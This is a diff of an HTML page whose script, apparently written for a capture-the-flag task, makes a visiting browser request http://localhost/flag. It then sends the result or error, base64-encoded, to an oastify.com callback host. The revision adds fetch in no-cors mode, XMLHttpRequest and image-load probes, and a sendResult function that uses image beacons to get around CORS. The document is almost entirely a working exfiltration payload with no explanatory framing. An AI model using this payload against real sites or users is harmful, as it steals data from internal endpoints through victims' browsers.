@@ -6,23 +6,57 @@
 <body>
 <script>
 setTimeout(() => {
-    fetch('http://localhost/flag')
-        .then(r => r.text())
-        .then(flag => {
-            // Use HTTPS for the callback
-            fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag=' + btoa(flag))
-                .then(() => {
-                    document.body.innerHTML = '<h1>Flag submitted!</h1>';
-                });
+    // Method 1: Use mode 'no-cors' (but you can't read response)
+    fetch('http://localhost/flag', { mode: 'no-cors' })
+        .then(() => {
+            // Even with no-cors, we can detect if request was made
+            sendResult('success', 'Request completed (no-cors mode)');
         })
         .catch(err => {
-            // Use HTTPS for the callback
-            fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error=' + btoa(err.toString()))
-                .then(() => {
-                    document.body.innerHTML = '<h1>Error submitted!</h1>';
-                });
+            sendResult('error', err.toString());
         });
+
+    // Method 2: Use XMLHttpRequest with error handling
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://localhost/flag');
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            if (xhr.status === 0 || xhr.status === 200) {
+                // Even with CORS error, we might get some info
+                sendResult('success', 'XHR completed - Status: ' + xhr.status);
+            }
+        }
+    };
+    xhr.onerror = function() {
+        sendResult('error', 'XHR failed - CORS blocked');
+    };
+    xhr.send();
+
+    // Method 3: Use image tag to detect if resource exists
+    const img = new Image();
+    img.onload = function() {
+        sendResult('success', 'Image loaded - resource exists');
+    };
+    img.onerror = function() {
+        sendResult('error', 'Image failed to load');
+    };
+    img.src = 'http://localhost/flag';
+
 }, 2000);
+
+function sendResult(type, data) {
+    const encoded = btoa(data);
+    
+    // Send via image (bypasses CORS)
+    new Image().src = 'https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '=' + encoded;
+    
+    // Also try fetch with no-cors
+    fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '2=' + encoded, { 
+        mode: 'no-cors' 
+    });
+    
+    console.log(type + ':', data);
+}
 </script>
 </body>
 </html>
